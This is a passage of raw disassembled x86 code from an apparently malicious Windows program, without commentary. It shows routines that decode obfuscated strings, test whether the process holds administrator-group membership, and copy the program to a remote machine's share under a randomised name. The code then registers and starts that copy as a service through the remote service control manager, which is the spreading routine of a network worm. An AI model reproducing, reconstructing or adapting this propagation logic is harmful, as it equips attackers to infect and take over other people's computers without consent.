		call	_strcat
		push	0Ah
		push	esi
		call	sub_403434
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		push	0Bh
		push	esi
		call	sub_403434
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		add	esp, 40h
		push	[ebp+var_8]	; char *
		push	edi		; char *
		call	_strcat
		push	0Ch
		push	esi
		call	sub_403434
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		mov	eax, [ebp+arg_0]
		push	ebx
		mov	[eax+91Ch], ebx
		lea	esi, [eax+6B0h]
		call	sub_4046AB
		and	eax, 1
		push	eax
		push	offset unk_40FD50
		call	sub_403434
		push	eax		; char *
		push	esi		; char *
		call	_strcpy
		push	offset aYRNyWnyvNy_Tnn ; char *
		push	esi		; char *
		call	_strcat
		add	esp, 34h

loc_4021C9:				; CODE XREF: sub_401DC4+1AAj
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_401DC4	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ


sub_4021CE	proc near		; CODE XREF: sub_401A1E+145p

var_64		= byte ptr -64h
arg_0		= dword	ptr  4
arg_4		= dword	ptr  8

		sub	esp, 64h
		push	ebx
		mov	ebx, [esp+68h+arg_0]
		push	ebp
		push	esi
		lea	ebp, [ebx+0C8h]
		push	edi
		lea	esi, [ebx+1ACh]
		push	ebp
		push	(offset	aMwSNdSN_TsNnnd+18h)
		push	esi
		call	_sprintf
		mov	edi, offset aP_wqsknsknvTTW ; "p_WqèknèknVÙ×TØŞ×TÜWnnnÅÚYÛnnÊØŞİÜFŞTZn"...
		push	edi		; char *
		push	esi		; char *
		call	_strcat
		push	edi		; char *
		push	esi		; char *
		call	_strcat
		push	offset aMwSNdSN_TsNnnd ; char *
		push	esi		; char *
		call	_strcat
		lea	eax, [ebx+64h]
		push	eax		; char *
		push	esi		; char *
		call	_strcat
		push	edi		; char *
		push	esi		; char *
		call	_strcat
		push	1
		push	offset aMwSNdSN_TsNnnd ; "MWÙØs~nDÙs~nÇÔ_[ÜßTs~nnnDZÜ~]ÙXXÙÕÚYİ~Ø"...
		call	sub_403434
		push	eax		; char *
		push	esi		; char *
		call	_strcat
		add	esp, 44h
		push	ebp		; char *
		push	esi		; char *
		call	_strcat
		push	edi		; char *
		push	esi		; char *
		call	_strcat
		push	2
		push	offset aMwSNdSN_TsNnnd ; "MWÙØs~nDÙs~nÇÔ_[ÜßTs~nnnDZÜ~]ÙXXÙÕÚYİ~Ø"...
		call	sub_403434
		push	eax		; char *
		push	esi		; char *
		call	_strcat
		push	[esp+94h+arg_4]	; char *
		push	esi		; char *
		call	_strcat
		push	edi		; char *
		push	esi		; char *
		call	_strcat
		push	0
		call	sub_4046AB
		and	eax, 1
		mov	edi, (offset aMwSNdSN_TsNnnd+18h)
		inc	eax
		push	eax
		push	edi
		call	sub_403434
		push	eax		; char *
		push	esi		; char *
		call	_strcat
		add	esp, 44h
		push	3
		push	edi
		call	sub_403434
		push	eax		; char *
		push	esi		; char *
		call	_strcat
		lea	eax, [esp+84h+var_64]
		push	eax
		lea	eax, [ebx+64h]
		push	0
		push	eax
		call	sub_403AAD
		push	1
		push	(offset	aP_wqsknsknvTTW+7)
		call	sub_403434
		push	eax		; char *
		push	ebp		; char *
		call	_strcpy
		lea	eax, [esp+0A0h+var_64]
		push	eax		; char *
		push	ebp		; char *
		call	_strcat
		add	esp, 34h
		and	dword ptr [ebx+91Ch], 0
		pop	edi
		pop	esi
		pop	ebp
		pop	ebx
		add	esp, 64h
		retn
sub_4021CE	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_4022DB	proc near		; CODE XREF: sub_405FE9+37p

var_868		= byte ptr -868h
var_468		= byte ptr -468h
var_68		= dword	ptr -68h
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		sub	esp, 868h
		push	ebx
		push	esi
		push	edi
		mov	edi, [ebp+arg_4]
		push	offset aMwSNdSN_TsNnnd ; char *
		push	edi		; char *
		call	_strcpy
		mov	ebx, [ebp+arg_0]
		lea	eax, [ebp+var_868]
		push	eax
		lea	eax, [ebp+var_468]
		lea	esi, [ebx+0C8h]
		push	eax
		push	esi
		call	sub_403AAD
		lea	eax, [ebp+var_468]
		push	esi
		push	eax
		lea	eax, [ebp+var_868]
		push	offset unk_40FD07
		push	eax
		call	_sprintf
		lea	eax, [ebp+var_868]
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		mov	esi, (offset aP_wqsknsknvTTW+7)
		push	esi		; char *
		push	edi		; char *
		call	_strcat
		push	1
		push	offset aMwSNdSN_TsNnnd ; "MWÙØs~nDÙs~nÇÔ_[ÜßTs~nnnDZÜ~]ÙXXÙÕÚYİ~Ø"...
		call	sub_403434
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		add	esp, 44h
		lea	eax, [ebx+64h]
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		push	esi		; char *
		push	edi		; char *
		call	_strcat
		push	2
		push	offset aMwSNdSN_TsNnnd ; "MWÙØs~nDÙs~nÇÔ_[ÜßTs~nnnDZÜ~]ÙXXÙÕÚYİ~Ø"...
		call	sub_403434
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		lea	eax, [ebx+12Ch]
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		push	esi		; char *
		push	edi		; char *
		call	_strcat
		push	(offset	aP_wqsknsknvTTW+27h) ; char *
		push	edi		; char *
		call	_strcat
		lea	eax, [ebx+8B8h]
		push	eax		; char *
		push	edi		; char *
		mov	[ebp+arg_4], eax
		call	_strcat
		add	esp, 40h
		push	esi		; char *
		push	edi		; char *
		call	_strcat
		push	esi		; char *
		push	edi		; char *
		call	_strcat
		push	7
		push	14h
		lea	eax, [ebp+var_68]
		push	8
		push	eax
		call	sub_403624
		push	1
		push	[ebp+arg_4]
		push	edi
		call	sub_40260D
		add	esp, 2Ch
		cmp	dword ptr [ebx+91Ch], 0
		mov	eax, esi
		jz	short loc_402404
		lea	eax, [ebp+var_68]
		push	eax
		lea	eax, [ebp+var_868]
		push	offset unk_40F8D7
		push	eax
		call	_sprintf
		add	esp, 0Ch
		lea	eax, [ebp+var_868]

loc_402404:				; CODE XREF: sub_4022DB+109j
		push	eax
		lea	eax, [ebp+var_468]
		push	offset unk_40F7BD
		push	eax
		call	_sprintf
		lea	eax, [ebp+var_468]
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		lea	eax, [ebx+1ACh]
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		push	offset aP	; char *
		push	edi		; char *
		call	_strcat
		push	esi		; char *
		push	edi		; char *
		call	_strcat
		push	esi		; char *
		push	edi		; char *
		call	_strcat
		push	0
		call	sub_4046AB
		add	esp, 38h
		and	eax, 1
		cmp	dword ptr [ebx+91Ch], 0
		mov	[ebp+arg_0], eax
		jnz	short loc_402469
		mov	[ebp+arg_0], 2

loc_402469:				; CODE XREF: sub_4022DB+185j
		push	1
		push	[ebp+arg_4]
		push	edi
		call	sub_40260D
		add	esp, 0Ch
		lea	eax, [ebp+var_68]
		push	eax
		lea	eax, [ebx+6B0h]
		push	eax
		push	[ebp+arg_0]
		push	offset unk_40F89D
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		lea	eax, [ebp+var_468]
		push	offset unk_40F843
		push	eax
		call	_sprintf
		lea	eax, [ebp+var_468]
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		push	esi		; char *
		push	edi		; char *
		call	_strcat
		push	esi		; char *
		push	edi		; char *
		call	_strcat
		lea	eax, [ebp+var_4]
		push	1
		push	eax
		lea	eax, [ebx+5ACh]
		push	eax
		call	sub_4040BD
		add	esp, 38h
		mov	[ebp+arg_0], eax
		test	eax, eax
		jz	short loc_4024EC
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		push	[ebp+arg_0]
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 0Ch

loc_4024EC:				; CODE XREF: sub_4022DB+1FDj
		push	esi		; char *
		push	edi		; char *
		call	_strcat
		add	ebx, 7B4h
		pop	ecx
		pop	ecx
		cmp	byte ptr [ebx],	0
		jz	loc_4025EF
		push	ebx
		call	sub_403D0B
		cmp	eax, 0C800h
		pop	ecx
		mov	[ebp+var_4], eax
		jb	short loc_402530
		cmp	eax, 7D000h
		jnb	loc_4025EF
		push	0
		call	sub_4046AB
		test	al, 1
		pop	ecx
		jz	loc_4025EF

loc_402530:				; CODE XREF: sub_4022DB+238j
		lea	eax, [ebp+var_4]
		push	0
		push	eax
		push	ebx
		call	sub_4040BD
		add	esp, 0Ch
		mov	[ebp+arg_0], eax
		test	eax, eax
		jz	loc_4025EF
		push	1
		push	[ebp+arg_4]
		push	edi
		call	sub_40260D
		push	1
		push	[ebp+arg_4]
		push	edi
		call	sub_40260D
		lea	eax, [ebp+var_468]
		push	eax		; char *
		lea	eax, [ebp+var_868]
		push	eax		; char *
		push	0		; char *
		push	0		; char *
		push	ebx		; char *
		call	__splitpath
		lea	eax, [ebp+var_468]
		push	eax		; char *
		lea	eax, [ebp+var_868]
		push	eax		; char *
		call	_strcat
		add	esp, 34h
		lea	eax, [ebp+var_68]
		push	eax
		lea	eax, [ebp+var_868]
		push	eax
		push	2
		push	offset unk_40F89D
		call	sub_403434
		pop	ecx
		pop	ecx
		push	eax
		lea	eax, [ebp+var_468]
		push	offset unk_40F843
		push	eax
		call	_sprintf
		lea	eax, [ebp+var_468]
		push	eax		; char *
		push	edi		; char *
		call	_strcat
		push	esi		; char *
		push	edi		; char *
		call	_strcat
		push	esi		; char *
		push	edi		; char *
		call	_strcat
		push	[ebp+arg_0]	; char *
		push	edi		; char *
		call	_strcat
		push	esi		; char *
		push	edi		; char *
		call	_strcat
		push	[ebp+arg_0]
		call	??3@YAXPAX@Z	; operator delete(void *)
		add	esp, 40h

loc_4025EF:				; CODE XREF: sub_4022DB+223j
					; sub_4022DB+23Fj ...
		push	0
		push	[ebp+arg_4]
		push	edi
		call	sub_40260D
		push	offset asc_40E040 ; char *
		push	edi		; char *
		call	_strcat
		add	esp, 14h
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_4022DB	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_40260D	proc near		; CODE XREF: sub_4022DB+F8p
					; sub_4022DB+194p ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	offset asc_40E040 ; char *
		push	[ebp+arg_0]	; char *
		call	_strcat
		push	[ebp+arg_4]	; char *
		push	[ebp+arg_0]	; char *
		call	_strcat
		add	esp, 10h
		cmp	[ebp+arg_8], 0
		jz	short loc_402640
		push	(offset	aP_wqsknsknvTTW+7) ; char *
		push	[ebp+arg_0]	; char *
		call	_strcat
		pop	ecx
		pop	ecx

loc_402640:				; CODE XREF: sub_40260D+22j
		pop	ebp
		retn
sub_40260D	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_402642	proc near		; CODE XREF: sub_4053E8+74p

pSid1		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
pIdentifierAuthority= _SID_IDENTIFIER_AUTHORITY	ptr -28h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
pSid2		= dword	ptr -18h
pSid		= dword	ptr -14h
hObject		= dword	ptr -10h
ReturnLength	= dword	ptr -0Ch
hMem		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		push	ebx
		push	esi
		push	edi
		call	ds:GetCurrentProcessId
		mov	edi, [ebp+arg_0]
		xor	ebx, ebx
		push	eax		; dwProcessId
		push	ebx		; bInheritHandle
		push	1F0FFFh		; dwDesiredAccess
		mov	[ebp+hObject], ebx
		mov	[ebp+ReturnLength], 32h
		mov	[ebp+hMem], ebx
		mov	[ebp+pIdentifierAuthority.Value], bl
		mov	[ebp+pIdentifierAuthority.Value+1], bl
		mov	[ebp+pIdentifierAuthority.Value+2], bl
		mov	[ebp+pIdentifierAuthority.Value+3], bl
		mov	[ebp+pIdentifierAuthority.Value+4], bl
		mov	[ebp+pIdentifierAuthority.Value+5], 5
		mov	[ebp+pSid2], ebx
		mov	[ebp+pSid], ebx
		mov	[ebp+var_4], ebx
		mov	[ebp+var_1C], ebx
		mov	[edi], ebx
		call	ds:OpenProcess
		lea	ecx, [ebp+hObject]
		mov	[ebp+var_20], eax
		push	ecx		; TokenHandle
		push	8		; DesiredAccess
		push	eax		; ProcessHandle
		call	ds:OpenProcessToken ; Open the access token associated with a process
		test	eax, eax
		jnz	short loc_4026B3

loc_4026A5:				; CODE XREF: sub_402642+80j
		call	ds:GetLastError

loc_4026AB:				; CODE XREF: sub_402642+113j
		mov	[ebp+var_4], eax
		jmp	loc_4027C5
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4026B3:				; CODE XREF: sub_402642+61j
		push	[ebp+ReturnLength] ; uBytes
		push	ebx		; uFlags
		call	ds:LocalAlloc
		cmp	eax, ebx
		mov	[ebp+hMem], eax
		jz	short loc_4026A5
		lea	ecx, [ebp+ReturnLength]
		push	ecx		; ReturnLength
		push	[ebp+ReturnLength] ; TokenInformationLength
		push	eax		; TokenInformation
		push	2		; TokenInformationClass
		push	[ebp+hObject]	; TokenHandle
		call	ds:GetTokenInformation ; Get specified type of information
					; about	an access token
		mov	esi, ds:GetLastError
		test	eax, eax
		jnz	short loc_402719
		call	esi ; GetLastError
		cmp	eax, 7Ah
		jnz	short loc_402753
		push	[ebp+hMem]	; hMem
		call	ds:LocalFree
		push	[ebp+ReturnLength] ; uBytes
		push	ebx		; uFlags
		call	ds:LocalAlloc
		cmp	eax, ebx
		mov	[ebp+hMem], eax
		jz	short loc_402753
		lea	ecx, [ebp+ReturnLength]
		push	ecx		; ReturnLength
		push	[ebp+ReturnLength] ; TokenInformationLength
		push	eax		; TokenInformation
		push	2		; TokenInformationClass
		push	[ebp+hObject]	; TokenHandle
		call	ds:GetTokenInformation ; Get specified type of information
					; about	an access token
		test	eax, eax
		jz	short loc_402753

loc_402719:				; CODE XREF: sub_402642+9Dj
		lea	eax, [ebp+pSid2]
		push	eax		; pSid
		push	ebx		; nSubAuthority7
		push	ebx		; nSubAuthority6
		push	ebx		; nSubAuthority5
		push	ebx		; nSubAuthority4
		push	ebx		; nSubAuthority3
		push	ebx		; nSubAuthority2
		push	ebx		; nSubAuthority1
		push	4		; nSubAuthority0
		lea	eax, [ebp+pIdentifierAuthority]
		push	1		; nSubAuthorityCount
		push	eax		; pIdentifierAuthority
		call	ds:AllocateAndInitializeSid ; Allocate and initializes a security
					; identifier with up to	eight subauthorities
		test	eax, eax
		jz	short loc_402753
		lea	eax, [ebp+pSid]
		push	eax		; pSid
		push	ebx		; nSubAuthority7
		push	ebx		; nSubAuthority6
		push	ebx		; nSubAuthority5
		push	ebx		; nSubAuthority4
		push	ebx		; nSubAuthority3
		push	ebx		; nSubAuthority2
		push	ebx		; nSubAuthority1
		push	6		; nSubAuthority0
		lea	eax, [ebp+pIdentifierAuthority]
		push	1		; nSubAuthorityCount
		push	eax		; pIdentifierAuthority
		call	ds:AllocateAndInitializeSid ; Allocate and initializes a security
					; identifier with up to	eight subauthorities
		test	eax, eax
		jnz	short loc_40275A

loc_402753:				; CODE XREF: sub_402642+A4j
					; sub_402642+BEj ...
		call	esi ; GetLastError
		jmp	loc_4026AB
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_40275A:				; CODE XREF: sub_402642+10Fj
		mov	esi, [ebp+hMem]
		mov	[ebp+arg_0], ebx
		cmp	[esi], ebx
		jbe	short loc_4027B6
		add	esi, 4

loc_402767:				; CODE XREF: sub_402642+15Cj
		push	[ebp+pSid2]	; pSid2
		mov	eax, [esi]
		mov	ecx, [esi+4]
		mov	[ebp+pSid1], eax
		push	eax		; pSid1
		mov	[ebp+var_2C], ecx
		call	ds:EqualSid	; Test two security identifier
					; values for equality
		test	eax, eax
		jnz	short loc_4027A2
		push	[ebp+pSid]	; pSid2
		push	[ebp+pSid1]	; pSid1
		call	ds:EqualSid	; Test two security identifier
					; values for equality
		test	eax, eax
		jnz	short loc_4027AD
		inc	[ebp+arg_0]
		mov	eax, [ebp+hMem]
		mov	ecx, [ebp+arg_0]
		add	esi, 8
		cmp	ecx, [eax]
		jb	short loc_402767
		jmp	short loc_4027B6
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4027A2:				; CODE XREF: sub_402642+13Cj
		mov	[ebp+var_1C], 1
		mov	[edi], ebx
		jmp	short loc_4027B6
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4027AD:				; CODE XREF: sub_402642+14Cj
		mov	dword ptr [edi], 1
		mov	[ebp+var_1C], ebx

loc_4027B6:				; CODE XREF: sub_402642+120j
					; sub_402642+15Ej ...
		cmp	[edi], ebx
		jnz	short loc_4027C5
		cmp	[ebp+var_1C], ebx
		jnz	short loc_4027C5
		mov	dword ptr [edi], 1

loc_4027C5:				; CODE XREF: sub_402642+6Cj
					; sub_402642+176j ...
		cmp	[ebp+pSid], ebx
		mov	esi, ds:FreeSid
		jz	short loc_4027D5
		push	[ebp+pSid]	; pSid
		call	esi ; FreeSid

loc_4027D5:				; CODE XREF: sub_402642+18Cj
		cmp	[ebp+pSid2], ebx
		jz	short loc_4027DF
		push	[ebp+pSid2]	; pSid
		call	esi ; FreeSid

loc_4027DF:				; CODE XREF: sub_402642+196j
		cmp	[ebp+hMem], ebx
		jz	short loc_4027ED
		push	[ebp+hMem]	; hMem
		call	ds:LocalFree

loc_4027ED:				; CODE XREF: sub_402642+1A0j
		cmp	[ebp+hObject], ebx
		mov	esi, ds:CloseHandle
		jz	short loc_4027FD
		push	[ebp+hObject]	; hObject
		call	esi ; CloseHandle

loc_4027FD:				; CODE XREF: sub_402642+1B4j
		cmp	[ebp+var_20], ebx
		jz	short loc_402807
		push	[ebp+var_20]	; hObject
		call	esi ; CloseHandle

loc_402807:				; CODE XREF: sub_402642+1BEj
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		leave
		retn
sub_402642	endp


; ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ S U B	R O U T	I N E ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

; Attributes: bp-based frame

sub_40280F	proc near		; CODE XREF: sub_406498+199p
					; sub_4066D2+F0p

var_2A90	= dword	ptr -2A90h
var_1A7C	= byte ptr -1A7Ch
var_B64		= dword	ptr -0B64h
WideCharStr	= word ptr -95Ch
var_754		= dword	ptr -754h
var_68C		= byte ptr -68Ch
ExistingFileName= byte ptr -588h
MultiByteStr	= byte ptr -484h
var_290		= byte ptr -290h
var_18D		= byte ptr -18Dh
ServiceName	= byte ptr -88h
Buffer		= byte ptr -24h
nSize		= dword	ptr -4
lpMachineName	= dword	ptr  8
arg_4		= dword	ptr  0Ch
hSCObject	= dword	ptr  10h
hKey		= dword	ptr  14h
arg_10		= dword	ptr  18h
arg_14		= dword	ptr  1Ch

		push	ebp
		mov	ebp, esp
		mov	eax, 2A90h
		call	__alloca_probe
		push	ebx
		xor	ebx, ebx
		cmp	[ebp+hSCObject], ebx
		push	esi
		push	edi
		mov	[ebp+nSize], 20h
		mov	[ebp+ServiceName], bl
		jz	short loc_402846
		push	[ebp+hSCObject]	; char *
		lea	eax, [ebp+ServiceName]
		push	eax		; char *
		call	_strcpy
		pop	ecx
		pop	ecx
		jmp	short loc_40285B
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402846:				; CODE XREF: sub_40280F+22j
		push	7
		push	0Ah
		lea	eax, [ebp+ServiceName]
		push	5
		push	eax
		call	sub_403624
		add	esp, 10h

loc_40285B:				; CODE XREF: sub_40280F+35j
		cmp	[ebp+arg_10], ebx
		jz	short loc_402865
		push	[ebp+arg_10]
		jmp	short loc_40286A
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402865:				; CODE XREF: sub_40280F+4Fj
		push	offset FileName	; char *

loc_40286A:				; CODE XREF: sub_40280F+54j
		lea	eax, [ebp+ExistingFileName]
		push	eax		; char *
		call	_strcpy
		mov	esi, [ebp+lpMachineName]
		pop	ecx
		pop	ecx
		lea	eax, [ebp-18Ch]
		push	esi		; char *
		push	eax		; char *
		call	_strcpy
		push	[ebp+arg_4]	; char *
		lea	eax, [ebp-18Ch]
		push	eax		; char *
		call	_strcat
		add	esp, 10h
		cmp	[ebp+hKey], ebx
		jz	short loc_4028B2
		push	[ebp+hKey]	; char *
		lea	eax, [ebp+var_290]
		push	eax		; char *
		call	_strcpy
		pop	ecx
		pop	ecx
		jmp	short loc_4028D4
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_4028B2:				; CODE XREF: sub_40280F+8Ej
		push	1
		push	offset aYRNyWnyvNy_Tnn ; "yÜRÜny×ßWnyVÚ]ny_ŞTnnnnnnnnnnnnnyTRTnyZ"...
		call	_rand
		push	2
		cdq
		pop	ecx
		idiv	ecx
		lea	eax, [ebp+var_290]
		push	edx
		push	eax
		call	sub_404156
		add	esp, 10h

loc_4028D4:				; CODE XREF: sub_40280F+A1j
		cmp	dword_491EF8, ebx
		jz	short loc_4028FA
		push	1
		push	ebx
		call	_rand
		push	2
		cdq
		pop	ecx
		idiv	ecx
		lea	eax, [ebp+var_290]
		push	edx
		push	eax
		call	sub_404156
		add	esp, 10h

loc_4028FA:				; CODE XREF: sub_40280F+CBj
		lea	eax, [ebp-18Ch]
		push	eax		; char *
		call	_strlen
		cmp	[ebp+eax+var_18D], 5Ch
		lea	eax, [ebp+eax+var_18D]
		pop	ecx
		jnz	short loc_40291A
		mov	[eax], bl

loc_40291A:				; CODE XREF: sub_40280F+107j
		cmp	[ebp+var_290], 5Ch
		jz	short loc_402936
		lea	eax, [ebp-18Ch]
		push	offset asc_40E044 ; char *
		push	eax		; char *
		call	_strcat
		pop	ecx
		pop	ecx

loc_402936:				; CODE XREF: sub_40280F+112j
		lea	eax, [ebp+var_290]
		push	eax		; char *
		lea	eax, [ebp-18Ch]
		push	eax		; char *
		call	_strcat
		pop	ecx
		lea	eax, [ebp-18Ch]
		pop	ecx
		push	ebx		; bFailIfExists
		push	eax		; lpNewFileName
		lea	eax, [ebp+ExistingFileName]
		push	eax		; lpExistingFileName
		call	ds:CopyFileA
		test	eax, eax
		jz	loc_402AC1
		call	_rand
		push	5
		cdq
		pop	ecx
		idiv	ecx
		test	edx, edx
		jz	short loc_402999
		call	_rand
		cdq
		mov	ecx, 2800h
		idiv	ecx
		lea	eax, [ebp-18Ch]
		add	edx, 13080h
		push	edx
		push	eax
		call	sub_403F63
		pop	ecx
		pop	ecx

loc_402999:				; CODE XREF: sub_40280F+166j
		push	1F2Ah		; size_t
		lea	eax, [ebp+var_2A90]
		push	offset aI	; void *
		push	eax		; void *
		call	_memcpy
		lea	eax, [ebp+var_2A90]
		mov	[ebp+var_1A7C],	bl
		push	eax
		lea	eax, [ebp-18Ch]
		push	eax
		call	sub_4054EF
		add	esp, 14h
		cmp	dword_491EF8, ebx
		jnz	loc_402AC1
		lea	eax, [ebp+nSize]
		push	eax		; nSize
		lea	eax, [ebp+Buffer]
		push	eax		; lpBuffer
		call	ds:GetComputerNameA
		lea	eax, [ebp+Buffer]
		push	eax
		lea	eax, [esi+2]
		push	eax
		call	unknown_libname_9 ; Microsoft VisualC 2-7/net runtime
		pop	ecx
		test	eax, eax
		pop	ecx
		jz	loc_402AC1
		push	2		; dwDesiredAccess
		push	ebx		; lpDatabaseName
		push	esi		; lpMachineName
		mov	esi, ds:OpenSCManagerA ; Establish a connection	to the service
					; control manager on the specified computer
					; and opens the	specified database
		call	esi ; OpenSCManagerA ; Establish a connection to the service
					; control manager on the specified computer
					; and opens the	specified database
		mov	edi, eax
		cmp	edi, ebx
		jnz	short loc_402A17
		cmp	[ebp+arg_14], ebx
		jz	loc_402AC1

loc_402A17:				; CODE XREF: sub_40280F+1FDj
		push	ebx		; lpPassword
		push	ebx		; lpServiceStartName
		push	ebx		; lpDependencies
		push	ebx		; lpdwTagId
		lea	eax, [ebp-18Ch]
		push	ebx		; lpLoadOrderGroup
		push	eax		; lpBinaryPathName
		push	ebx		; dwErrorControl
		push	3		; dwStartType
		push	110h		; dwServiceType
		lea	eax, [ebp+ServiceName]
		push	ebx		; dwDesiredAccess
		push	eax		; lpDisplayName
		lea	eax, [ebp+ServiceName]
		push	eax		; lpServiceName
		push	edi		; hSCManager
		call	ds:CreateServiceA
		push	edi		; hSCObject
		mov	edi, ds:CloseServiceHandle
		call	edi ; CloseServiceHandle
		push	1		; dwDesiredAccess
		push	ebx		; lpDatabaseName
		push	[ebp+lpMachineName] ; lpMachineName
		call	esi ; OpenSCManagerA ; Establish a connection to the service
					; control manager on the specified computer
					; and opens the	specified database
		mov	esi, eax
		lea	eax, [ebp+ServiceName]
		push	10h		; dwDesiredAccess
		push	eax		; lpServiceName
		push	esi		; hSCManager
		call	ds:OpenServiceA
		push	ebx		; lpServiceArgVectors
		push	ebx		; dwNumServiceArgs
		push	eax		; hService
		mov	[ebp+hSCObject], eax
		call	ds:StartServiceA
		push	[ebp+hSCObject]	; hSCObject
		mov	[ebp+arg_10], eax
		call	edi ; CloseServiceHandle
		push	esi		; hSCObject
		call	edi ; CloseServiceHandle
		cmp	[ebp+arg_10], ebx
		jnz	loc_402BE9
		mov	edx, 81h
		xor	eax, eax
		mov	ecx, edx
		lea	edi, [ebp-95Ah]
		mov	[ebp+WideCharStr], bx
		mov	word ptr [ebp+var_B64],	bx
		rep stosd
		stosw
		mov	ecx, edx
		xor	eax, eax
		lea	edi, [ebp+var_B64+2]
		cmp	dword_491F0C, ebx
		rep stosd
		mov	[ebp+hSCObject], ebx
		mov	[ebp+arg_10], ebx
		stosw
		jnz	short loc_402AC8

loc_402AC1:				; CODE XREF: sub_40280F+153j
					; sub_40280F+1C2j ...
		xor	eax, eax
		jmp	loc_402BEC
; ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ

loc_402AC8:				; CODE XREF: sub_40280F+2B0j
		mov	eax, [ebp+arg_4]
		cmp	byte ptr [eax],	5Ch
		jnz	short loc_402AD7
		mov	[ebp+arg_10], 1

loc_402AD7:				; CODE XREF: sub_40280F+2BFj
		mov	edi, 104h
		lea	eax, [ebp+WideCharStr]
		push	edi		; cchWideChar
		mov	esi, ds:MultiByteToWideChar
		push	eax		; lpWideCharStr
		push	0FFFFFFFFh	; cchMultiByte
		push	[ebp+lpMachineName] ; lpMultiByteStr
		push	1		; dwFlags
		push	ebx		; CodePage
		call	esi ; MultiByteToWideChar
		mov	ecx, [ebp+arg_4]
		lea	eax, [ebp+var_B64]
		push	edi		; cchWideChar
		push	eax		; lpWideCharStr
		mov	eax, [ebp+arg_10]
